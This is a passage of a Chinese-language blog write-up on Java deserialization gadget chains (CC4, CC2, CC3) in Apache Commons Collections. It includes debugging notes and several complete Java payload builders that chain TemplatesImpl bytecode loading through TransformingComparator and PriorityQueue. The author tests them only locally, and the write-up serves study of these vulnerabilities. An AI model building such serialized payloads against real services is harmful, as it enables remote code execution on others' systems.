class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="调试"><a href="#调试" class="headerlink" title="&lt;3.2&gt;调试"></a>&lt;3.2&gt;调试</h3><p>调试一下</p><h4 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h4><p>PriorityQueue.heapify</p><p>此时size&#x3D;0,(0&gt;&gt;&gt;1)-1&#x3D;-1,不会进入循环调siftDown()</p><p>当size为2，(2&gt;&gt;&gt;1)-1&#x3D;0才能进入for循环</p><p><img src="/2025/05/13/CC4_CC2/image-20250429161142770-17459159288272.png" alt="image-20250429161142770"></p><ul><li>add两次，size就变为2</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">priorityQueue.add(<span class="hljs-number">1</span>);<br>priorityQueue.add(<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><p><img src="/2025/05/13/CC4_CC2/image-20250429163835643-174591632058710.png" alt="image-20250429163835643"></p><p>还有就是注意从readObject跟进去发现之后调到compare(arg1,arg2)</p><p>arg1和arg2就是add()两次传进去的值，所以这就为CC2直接连InvokerTransformer奠定了基础哈哈(因为transform方法的参数就是可控的了，不需要用到数组了)</p><p><img src="/2025/05/13/CC4_CC2/image-20250429211059393-17459359625835.png" alt="image-20250429211059393"></p><ul><li>当然也可以直接反射修改size为2</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;PriorityQueue&gt; c2 = PriorityQueue.class;<br><span class="hljs-type">Field</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> c2.getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>size.setAccessible(<span class="hljs-literal">true</span>);<br>size.set(priorityQueue,<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><h4 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h4><p>发现add之后，还没有反序列化就弹计算器了</p><p>这里add和之前put比较像，会提前消耗利用链 add()—&gt;offer()—&gt;siftUp()—&gt;siftUpUsingComparator()—&gt;compare().transform()</p><p>所以就得先断开，add之后再反射赋值</p><p><img src="/2025/05/13/CC4_CC2/image-20250429164516541-174591638801111.png" alt="image-20250429164516541"></p><p><img src="/2025/05/13/CC4_CC2/image-20250429164604374-174591638979412-17459359538564.png" alt="image-20250429164604374"></p><p><img src="/2025/05/13/CC4_CC2/image-20250429164616636-17459359517933.png" alt="image-20250429164616636"></p><h4 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h4><blockquote><p>后面学习CB时才发现，对这里并没有搞清楚</p></blockquote><p>add两次的时候一是为了使size变成2，在反序列化的时候满足条件能遍历，继续调后续利用链</p><p>二是给数组queue赋值，值会一直传到后面，作为后续compare方法的参数</p><ul><li>add时提前消耗也是有条件的：size要不为0，也就是说第一次add的时候并不会提前消耗</li></ul><p><img src="/2025/05/13/CC4_CC2/image-20250523090430705.png" alt="image-20250523090430705"></p><p>跟进去第二次add发现传进去的参数是   数组queue[0]  (即第一次传进去的值)   和   第二次传进去的值</p><p><img src="/2025/05/13/CC4_CC2/image-20250523091222601.png" alt="image-20250523091222601"></p><ul><li><p>在真正反序列化时的利用：</p><p>传的参数是数组queue[0]</p></li></ul><p><img src="/2025/05/13/CC4_CC2/image-20250523091837473.png" alt="image-20250523091837473"></p><p><img src="/2025/05/13/CC4_CC2/image-20250523094325183.png" alt="image-20250523094325183"></p><p>所以所以add修改size时，一定第一个add传参TrAXFilter.class</p><h3 id="最终构造"><a href="#最终构造" class="headerlink" title="&lt;3.3&gt;最终构造"></a>&lt;3.3&gt;最终构造</h3><p>可以直接反射修改size为2，也可以add两次(add需要注意会提前触发,它也可以不用数组)</p><p><strong>直接反射修改size</strong></p><ul><li>传参可以有两种方法：<ul><li>反射修改数组queue[]    或者     add一次传参(这么做可以不用数组了)</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//尾部代码执行</span><br>       <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>       Class&lt;TemplatesImpl&gt; c1 = TemplatesImpl.class;<br>       <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>       name.setAccessible(<span class="hljs-literal">true</span>);<br>       name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>       <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>       tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>       tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>       <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>       bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>       <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Security/java/tmp/classes/Test_.class&quot;</span>));<br>       <span class="hljs-type">byte</span>[][]codes=&#123;code&#125;;<br>       bytecodes.set(templates,codes);<br>       <span class="hljs-comment">//templates.newTransformer();</span><br>       InstantiateTransformer&lt;Object&gt; instantiateTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>       Transformer[] transformers=&#123;<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>               instantiateTransformer<br>       &#125;;<br>       <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br><br>       <span class="hljs-comment">//chainedTransformer.transform(1);</span><br><br>       <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);<br>      <span class="hljs-comment">// transformingComparator.compare(1,2);</span><br>       <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br><br>       Class&lt;PriorityQueue&gt; c2 = PriorityQueue.class;<br>       <span class="hljs-type">Field</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> c2.getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>       size.setAccessible(<span class="hljs-literal">true</span>);<br>       size.set(priorityQueue,<span class="hljs-number">2</span>);<br><br><br>       serialize(priorityQueue);<br>       unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><blockquote><p>从CB回来看发现反射修改size的话，可以变得再简单点，不用数组了</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//尾部代码执行</span><br>   <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>   Class&lt;TemplatesImpl&gt; c1 = TemplatesImpl.class;<br>   <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>   name.setAccessible(<span class="hljs-literal">true</span>);<br>   name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>   <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>   tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>   tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>   <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>   bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>   <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Security/java/tmp/classes/Test_.class&quot;</span>));<br>   <span class="hljs-type">byte</span>[][]codes=&#123;code&#125;;<br>   bytecodes.set(templates,codes);<br>  <br>   InstantiateTransformer&lt;Object&gt; instantiateTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br><br>   <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(instantiateTransformer);<br><br>   <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>   priorityQueue.add(TrAXFilter.class);<br><br><br>   Class&lt;PriorityQueue&gt; c2 = PriorityQueue.class;<br>   <span class="hljs-type">Field</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> c2.getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>   size.setAccessible(<span class="hljs-literal">true</span>);<br>   size.set(priorityQueue,<span class="hljs-number">2</span>);<br><br><br>   serialize(priorityQueue);<br>   unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br></code></pre></td></tr></table></figure><hr><p><strong>add修改size</strong></p><p>由于add提前触发利用链，要先断开后面，防止本地执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//尾部代码执行</span><br>      <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>      Class&lt;TemplatesImpl&gt; c1 = TemplatesImpl.class;<br>      <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>      name.setAccessible(<span class="hljs-literal">true</span>);<br>      name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>      <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>      tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>      tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>      <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>      bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>      <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Security/java/tmp/classes/Test_.class&quot;</span>));<br>      <span class="hljs-type">byte</span>[][]codes=&#123;code&#125;;<br>      bytecodes.set(templates,codes);<br>      <span class="hljs-comment">//templates.newTransformer();</span><br>      InstantiateTransformer&lt;Object&gt; instantiateTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>      <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br><br>      <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>      priorityQueue.add(TrAXFilter.class);<br>     priorityQueue.add(<span class="hljs-number">5</span>);<br>      Class&lt;TransformingComparator&gt; c2 = TransformingComparator.class;<br>      <span class="hljs-type">Field</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> c2.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>      transformer.setAccessible(<span class="hljs-literal">true</span>);<br>      transformer.set(transformingComparator,instantiateTransformer);<br><br><br><br><br>      serialize(priorityQueue);<br>      unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br></code></pre></td></tr></table></figure><hr><h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><h2 id="一-前言"><a href="#一-前言" class="headerlink" title="一.前言"></a>一.前言</h2><p>CC2和CC4没啥区别，调newTransformer不同而已</p><ul><li>CC2就是直接用TransformingComparator连接InvokerTransformer.transform.(TemplateImpl.newInstance),</li><li>CC4中ChainedTransformer.transform–&gt;InstantiateTransformer.transform(TrAXFilter.class)—&gt;TrAXFilter.constructor.newInstance</li></ul><p>直接用InvokerTransformer调，没有用到数组</p><h2 id="二-分析过程-1"><a href="#二-分析过程-1" class="headerlink" title="二.分析过程"></a>二.分析过程</h2><h3 id="尾部-1"><a href="#尾部-1" class="headerlink" title="&lt;2.1&gt;尾部"></a>&lt;2.1&gt;尾部</h3><p>CC2后半部分就还是代码执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//尾部代码执行</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        Class&lt;TemplatesImpl&gt; c1 = TemplatesImpl.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Security/java/tmp/classes/Test_.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][]codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br>     <span class="hljs-comment">//   templates.newTransformer();</span><br></code></pre></td></tr></table></figure><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="&lt;2.2&gt;InvokerTransformer"></a>&lt;2.2&gt;InvokerTransformer</h3><p>这里不同于CC4,直接用InvokerTransformer调newTransformer</p><p>为了防止后面put时本地执行，他要先断开</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>    TransformingComparator&lt;Object, Integer&gt; transformingComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<span class="hljs-comment">//断开</span><br></code></pre></td></tr></table></figure><h3 id="后续与CC4一样"><a href="#后续与CC4一样" class="headerlink" title="&lt;2.3&gt;后续与CC4一样"></a>&lt;2.3&gt;后续与CC4一样</h3><p>因为CC2没有用数组，直接用的InvokerTransformer.transform()调TemplateImpl.newTransformer,所以前面要传transform()的参数</p><p>跟进一下发现，add的第一个值就是TransformingComparator.compare.(transformer.transform(arg)) 的arg</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>       queue.add(templates);<br>       queue.add(templates);<br>       Class&lt;TransformingComparator&gt; c2 = TransformingComparator.class;<br>       <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> c2.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>       comparator.setAccessible(<span class="hljs-literal">true</span>);<br>       comparator.set(transformingComparator,invokerTransformer);<br>       serialize(queue);<br>       unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="三-最终exp"><a href="#三-最终exp" class="headerlink" title="三.最终exp"></a>三.最终exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//尾部代码执行</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        Class&lt;TemplatesImpl&gt; c1 = TemplatesImpl.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Security/java/tmp/classes/Test_.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][]codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br>     <span class="hljs-comment">//   templates.newTransformer();</span><br>        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>        TransformingComparator&lt;Object, Integer&gt; transformingComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br>        PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>        queue.add(templates);<br>        queue.add(templates);<br>        Class&lt;TransformingComparator&gt; c2 = TransformingComparator.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> c2.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(transformingComparator,invokerTransformer);<br>        serialize(queue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><p>其他的payload和上面CC4差不多的</p><h2 id="四-小结"><a href="#四-小结" class="headerlink" title="四.小结"></a>四.小结</h2><p><img src="/2025/05/13/CC4_CC2/image-20250504151559145.png" alt="image-20250504151559145"></p><p><strong>下面是不需要用到数组的：</strong></p><p>其实就CC1（官方的和TransformedMap都不行）不能控制transform的参数</p><p>CC6是TiedMapEntry(中key即为参数)，CC3前面与CC1相连的自然不能传了，与CC6相连就能传</p><p>CC4，CC2是PriorityQueue中 第一个add的即为transform参数</p><p>也就是说CC3前面与CC6相连，CC2,CC4与TransformerComparator.compare相连都能不用数组</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CC3</title>
    <link href="/2025/04/23/CC3/"/>
    <url>/2025/04/23/CC3/</url>
    
    <content type="html"><![CDATA[<p>CC3_InvokerTransformer&amp;&amp;CC3_InstantiateTransformer</p><span id="more"></span><h2 id="CC3-InvokerTransformer"><a href="#CC3-InvokerTransformer" class="headerlink" title="CC3_InvokerTransformer"></a>CC3_InvokerTransformer</h2><p><img src="/2025/04/23/CC3/image-20250428190941496-17458386128001.png" alt="image-20250428190941496"></p><p><strong>回顾类加载：</strong></p><p>classLoader.loadClass</p><p>​findClass—&gt;子类.findClass(重写的ClassLoader的findclass)—&gt;defineClass(从字节码加载类)</p><p><strong>defineClass只加载类，并没有执行类，进行类的初始化，还需要实例化newInstance触发类的初始化</strong></p><p>​</p><h3 id="尾部：加载类执行任意代码"><a href="#尾部：加载类执行任意代码" class="headerlink" title="尾部：加载类执行任意代码"></a>尾部：加载类执行任意代码</h3><p>ClassLoader的defineclass方法作用域是protected ，找重写的public方法</p><p>在TemplatesImpl中 内部类TransletClassLoader继承了Classloader，有重写的默认defalut的defineClass</p><p>default说明可以在自己类中调用</p><p><img src="/2025/04/23/CC3/image-20250421084139564-174541371225327.png" alt="image-20250421084139564"></p><p>继续找用法，在TemplatesImpl自己类中找到 private 的defineTransletClasses调了自己的defineclass从字节码中加载类赋值给数组_class  ，接着找谁调了defineTransletClasses</p><p><img src="/2025/04/23/CC3/image-20250421084942921-17454122737692.png" alt="image-20250421084942921"></p><ul><li><p>这里要注意：</p><p>_bytecodes  , _tfactory  都要赋值</p><p><img src="/2025/04/23/CC3/image-20250421164501487-17454122779993.png" alt="image-20250421164501487"></p></li></ul><p>继续谁调defineTransletClasses，找到三个用法</p><p>第三个getTransletInstance比较合适，因为它还实例化了，<strong>说明走完这个方法就能直接执行代码</strong></p><p>其他两个用法一个返回数组，一个返回下标</p><p>但getTransletInstance是private的，继续找</p><p><img src="/2025/04/23/CC3/image-20250421090806065-17454122797014.png" alt="image-20250421090806065"></p><p>找到了TemplatesImpl的<strong>public  newTransformer</strong> 调了getTransletInstance</p><p><img src="/2025/04/23/CC3/image-20250421090957222-17454122814265.png" alt="image-20250421090957222"></p><p>它还实现Serializable，可序列化，它的所有私有属性就可以反射修改</p><h3 id="利用-传关键参数"><a href="#利用-传关键参数" class="headerlink" title="利用(传关键参数)"></a>利用(传关键参数)</h3><p>按上面的分析，执行就是实例化 TemplatesImpl对象后调newTransformer，走到getTransletInstance将加载的_class[]  newInstance就可以了</p><p><em><strong>执行：</strong></em></p><p>TemplatesImpl.newTransformer.getTransletInstance———&gt;&gt;&gt;</p><p>​TemplatesImpl.getTransletInstance(_class[].newInstance 这里触发类加载初始化)  &lt;&lt;&lt;—————-</p><p>​TemplatesImpl.defineTransletClasses(在此方法中调用它的一个内部类重写的defineclass从字节码加载类赋值到数组_class[]中)</p><hr><p>现在就要具体构造：传一些关键参数</p><p>TemplatesImpl无参构造里面没有任何的赋值，找我们利用链上的需要赋值的属性来完成一些连接</p><p><img src="/2025/04/23/CC3/image-20250421092803927-17454122836986.png" alt="image-20250421092803927"></p><p>1 .<strong>_name  ， _class</strong></p><p>TemplatesImpl.getTransletInstance中要先调defineTransletClasses，再执行_class[ _transletIndex].newInstance()     <img src="/2025/04/23/CC3/image-20250421092300447-17454122850257.png" alt="image-20250421092300447"></p><ul><li><p>有参构造器protected,无参构造器public没有实现任何初始化，所以 反射赋值_name</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>Class&lt;TemplatesImpl&gt; c1 = TemplatesImpl.class;<br><span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>nameFiled.setAccessible(<span 